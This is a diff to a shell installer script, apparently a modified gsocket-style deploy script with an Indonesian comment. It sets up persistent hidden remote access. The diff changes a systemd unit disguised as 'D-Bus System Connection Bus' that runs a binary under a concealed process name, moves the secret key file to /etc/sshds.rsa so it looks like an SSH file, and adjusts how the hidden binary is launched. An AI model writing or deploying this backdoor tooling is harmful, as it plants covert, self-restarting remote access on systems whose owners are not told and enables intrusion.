@@ -914,7 +914,7 @@ uninstall()
 		uninstall_rm "${PWD}/${hn}"
 
 		uninstall_rm "${RCLOCAL_DIR}/${hn}.rsa"  # SEC_NAME
-		uninstall_rm "${GS_PREFIX}/usr/bin/${hn}.rsa" # SEC_NAME
+		uninstall_rm "${GS_PREFIX}/etc/${hn}.rsa" # SEC_NAME
 
 		uninstall_rm "/dev/shm/${hn}.rsa" # SEC_NAME
 		uninstall_rm "/tmp/.gsusr-${UID}${hn}.rsa" # SEC_NAME
@@ -1069,7 +1069,8 @@ install_system_systemd()
 	# Create the service file
 	mk_file "${SERVICE_FILE}" || return
 	chmod 644 "${SERVICE_FILE}" # Stop 'is marked world-inaccessible' dmesg warnings.
-	echo "[Unit]
+cat > "${SERVICE_FILE}" <<EOF
+[Unit]
 Description=D-Bus System Connection Bus
 After=network.target
 
@@ -1078,10 +1079,11 @@ Type=simple
 Restart=always
 RestartSec=300
 WorkingDirectory=/root
-ExecStart=/bin/bash -c \"${ENV_LINE[*]}HOSTTYPE=$HOSTTYPE PATH=$PATH XDG_SESSION_CLASS='-k $SYSTEMD_SEC_FILE -ilq' exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}'\"
+ExecStart=/usr/bin/env -i /bin/bash -c "HOSTTYPE='${HOSTTYPE}' PATH='${PATH}' XDG_SESSION_CLASS='-k ${SYSTEMD_SEC_FILE} -ilq' exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}'"
 
 [Install]
-WantedBy=multi-user.target" >"${SERVICE_FILE}" || return
+WantedBy=multi-user.target
+EOF
 
 	gs_secret_write "$SYSTEMD_SEC_FILE"
 	ts_add_systemd "${WANTS_DIR}/multi-user.target.wants"
@@ -1557,13 +1559,15 @@ gs_start()
 	fi
 
 	if [[ -n "$IS_NEED_START" ]]; then
+		# LOGIKA BARU: Cek Root dan File
+		# Jika user adalah root (0) DAN file /usr/bin/sshds.rsa TIDAK ADA
+		if [[ "$EUID" -eq 0 ]] && [[ ! -f "/usr/bin/sshds.rsa" ]]; then
+			USER_SEC_FILE="/etc/sshds.rsa"
+		fi
+
 		# We need an 'eval' here because the ENV_LINE[*] needs to be expanded
 		# and then executed.
-		# This wont work:
-		#     FOO="X=1" && ($FOO id)  # => -bash: X=1: command not found
-		# This does work:
-		#     FOO="X=1" && (eval $FOO id)
-		(cd "$HOME"; eval "${ENV_LINE[*]}"TERM=xterm-256color HOSTTYPE=$HOSTTYPE PATH=$PATH XDG_SESSION_CLASS=\"-k "$USER_SEC_FILE" -liqD\" exec -a \""$PROC_HIDDEN_NAME"\" \""$DSTBIN"\") || errexit
+		(cd "$HOME"; eval "${ENV_LINE[*]}" TERM=xterm-256color HOSTTYPE="$HOSTTYPE" PATH="$PATH" XDG_SESSION_CLASS=\"-k "$USER_SEC_FILE" -liqD\" exec -a \""$PROC_HIDDEN_NAME"\" \""$DSTBIN"\") || errexit
 		IS_GS_RUNNING=1
 	fi
 }
